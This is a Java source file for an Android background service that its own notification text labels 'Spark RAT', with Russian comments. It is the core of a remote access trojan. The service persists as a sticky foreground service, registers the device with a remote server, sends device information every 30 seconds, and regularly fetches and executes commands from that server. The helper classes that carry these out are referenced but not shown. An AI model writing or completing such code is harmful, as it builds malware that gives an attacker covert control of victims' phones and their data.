package com.spark.android;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Binder;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class SparkService extends Service {
    private static final String TAG = "SparkService";
    private static final String CHANNEL_ID = "SparkServiceChannel";
    private static final int NOTIFICATION_ID = 1;
    private static final int HEARTBEAT_INTERVAL = 30; // секунды

    private IBinder binder = new SparkBinder();
    private ScheduledExecutorService scheduler;
    private SparkHttpClient httpClient;
    private DeviceInfoCollector deviceInfo;
    private CommandProcessor commandProcessor;
    
    public class SparkBinder extends Binder {
        public SparkService getService() {
            return SparkService.this;
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "SparkService created");
        
        createNotificationChannel();
        scheduler = Executors.newScheduledThreadPool(2);
        httpClient = new SparkHttpClient(this);
        deviceInfo = new DeviceInfoCollector(this);
        commandProcessor = new CommandProcessor(this);
        
        // Запускаем основной цикл
        startMainLoop();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "SparkService started");
        
        // Создаем уведомление для foreground service
        Notification notification = createNotification();
        startForeground(NOTIFICATION_ID, notification);
        
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return binder;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "SparkService destroyed");
        
        if (scheduler != null) {
            scheduler.shutdown();
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Spark Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Фоновый сервис Spark RAT");
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0
        );

        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Spark RAT")
            .setContentText("Сервис активен")
            .setSmallIcon(R.drawable.ic_notification)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build();
    }

    private void startMainLoop() {
        // Первичная регистрация устройства
        registerDevice();
        
        // Запускаем периодический heartbeat
        scheduler.scheduleWithFixedDelay(this::sendHeartbeat, 10, HEARTBEAT_INTERVAL, TimeUnit.SECONDS);
        
        // Запускаем обработку команд
        scheduler.scheduleWithFixedDelay(this::processCommands, 15, HEARTBEAT_INTERVAL, TimeUnit.SECONDS);
    }

    private void registerDevice() {
        new Thread(() -> {
            try {
                DeviceInfo info = deviceInfo.collectDeviceInfo();
                boolean success = httpClient.registerDevice(info);
                
                if (success) {
                    Log.d(TAG, "Device registered successfully");
                } else {
                    Log.e(TAG, "Failed to register device");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error registering device", e);
            }
        }).start();
    }

    private void sendHeartbeat() {
        new Thread(() -> {
            try {
                DeviceInfo info = deviceInfo.collectPartialInfo();
                httpClient.sendHeartbeat(info);
            } catch (Exception e) {
                Log.e(TAG, "Error sending heartbeat", e);
            }
        }).start();
    }

    private void processCommands() {
        new Thread(() -> {
            try {
                commandProcessor.fetchAndExecuteCommands();
            } catch (Exception e) {
                Log.e(TAG, "Error processing commands", e);
            }
        }).start();
    }

    // Геттеры для доступа из других компонентов
    public SparkHttpClient getHttpClient() {
        return httpClient;
    }

    public DeviceInfoCollector getDeviceInfo() {
        return deviceInfo;
    }

    public CommandProcessor getCommandProcessor() {
        return commandProcessor;
    }

    public SharedPreferences getPreferences() {
        return getSharedPreferences("spark_config", Context.MODE_PRIVATE);
    }
}